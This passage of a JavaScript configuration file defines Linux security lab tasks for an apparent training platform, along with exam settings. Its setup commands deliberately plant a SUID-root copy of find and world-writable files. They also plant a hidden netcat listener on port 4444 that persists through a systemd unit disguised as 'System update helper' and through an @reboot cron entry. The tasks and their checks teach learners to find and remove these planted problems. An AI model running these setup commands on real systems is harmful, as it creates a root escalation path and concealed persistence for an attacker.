      setup: "cp /usr/bin/find /usr/local/bin/findx; chmod 4755 /usr/local/bin/findx; printf 'db_host=10.10.0.10\\ndb_user=app\\n' > /etc/app.conf; chmod 666 /etc/app.conf; mkdir -p /srv/share; chmod 777 /srv/share",
      intro: "Someone left three risky permissions on this server: an extra program that runs as root for anyone (SUID), a configuration file anyone can change, and a shared folder where anyone can delete anyone else's files. Find and fix them without breaking the system's legitimate SUID programs.",
      steps: [
        "List SUID programs: `sudo find / -xdev -perm -4000 -type f 2>/dev/null`. Normal ones live in /usr/bin and /usr/sbin (passwd, sudo, su, mount...). Anything in /usr/local or a home folder deserves a question.",
        "Remove the SUID bit from the copy of find: `sudo chmod u-s /usr/local/bin/findx` (or delete it)",
        "Find world-writable files: `sudo find /etc /srv -xdev -perm -0002 ! -type l 2>/dev/null`",
        "Fix the config file: `sudo chown root:root /etc/app.conf` and `sudo chmod 640 /etc/app.conf`",
        "Shared folders need the sticky bit so people can only delete their own files: `sudo chmod 1777 /srv/share` (like /tmp)",
        "Check your work with the two find commands again"
      ],
      checks: [
        { label: "No SUID programs in /usr/local", cmd: "[ -z \"$(find /usr/local -xdev -perm -4000 -type f 2>/dev/null)\" ]" },
        { label: "/etc/app.conf isn't world-writable", cmd: "[ -e /etc/app.conf ] && [ $(( 8#$(stat -c %a /etc/app.conf) & 2 )) -eq 0 ]" },
        { label: "/srv/share has the sticky bit or isn't world-writable", cmd: "m=8#$(stat -c %a /srv/share); [ $(( m & 01000 )) -ne 0 ] || [ $(( m & 2 )) -eq 0 ]" },
        { keep: true, label: "passwd and sudo still work (SUID kept)", cmd: "[ -u /usr/bin/passwd ] && [ -u /usr/bin/sudo ]" }
      ] },
    { id: "persistence", group: "blue", title: "Find and remove an unknown listener", mode: "single", minutes: 20, level: "Advanced", certs: ["security-plus", "cysa-plus", "linux-plus", "securityx"],
      setup: "mkdir -p /usr/local/lib/.sysupd /root/incident; printf '#!/bin/bash\\nexec nc -lk 4444 >/dev/null 2>&1\\n' > /usr/local/lib/.sysupd/updater.sh; chmod 755 /usr/local/lib/.sysupd/updater.sh; printf '[Unit]\\nDescription=System update helper\\n[Service]\\nExecStart=/usr/local/lib/.sysupd/updater.sh\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/sys-update-helper.service; systemctl daemon-reload; systemctl enable --now sys-update-helper.service >/dev/null 2>&1; (crontab -l 2>/dev/null; echo '@reboot /usr/local/lib/.sysupd/updater.sh') | crontab -; sleep 1",
      intro: "A network scan shows this server listening on TCP port 4444, which nothing on it should use. Find which program and service own the port, note them in /root/incident/listener.txt, and remove the listener and every way it restarts itself.",
      steps: [
        "Find what listens: `sudo ss -ltnp` and look for :4444 (the process and PID are in the last column)",
        "Find the program behind the PID: `sudo ls -l /proc/<PID>/exe` and `ps -o pid,ppid,cmd -p <PID>`",
        "Find the service: `systemctl status <PID>` names the unit that started it",
        "Record what you found (the unit name and the port): `echo 'sys-update-helper.service 4444' | sudo tee /root/incident/listener.txt`",
        "Stop it and stop it coming back: `sudo systemctl disable --now sys-update-helper`, then delete the unit file and run `sudo systemctl daemon-reload`",
        "Look for other persistence: `sudo crontab -l`, `ls /etc/cron.d`, `systemctl list-timers`. Remove the cron line with `sudo crontab -e`.",
        "Delete the program's folder: `sudo rm -r /usr/local/lib/.sysupd`, then confirm with `sudo ss -ltnp`"
      ],
      checks: [
        { label: "listener.txt names the service and the port", cmd: "grep -q sys-update-helper /root/incident/listener.txt && grep -qw 4444 /root/incident/listener.txt" },
        { label: "Nothing listens on port 4444", cmd: "! ss -ltn | grep -Eq '[:.]4444[[:space:]]'" },
        { label: "The service is stopped and won't start at boot", cmd: "! systemctl is-active -q sys-update-helper 2>/dev/null && ! systemctl is-enabled -q sys-update-helper 2>/dev/null" },
        { label: "The cron entry is gone", cmd: "! crontab -l 2>/dev/null | grep -q sysupd" },
        { label: "The program's folder is deleted", cmd: "[ ! -e /usr/local/lib/.sysupd ]" },
        { keep: true, label: "SSH is still running", cmd: "systemctl is-active ssh" }
      ] }
  ],
  // The VM exam: a timed set of tasks on one VM, scored by the same checks. Tasks are drawn at random.
  exam: {
    minutes: 45, tasks: 6, pass: 70,
    pool: ["users", "shared-dir", "acl", "sudo", "service", "timer", "cron", "partitions", "journal", "processes", "firewall",
      "ssh-hardening", "file-integrity", "sudo-audit", "permissions-audit", "persistence"]
  }
};
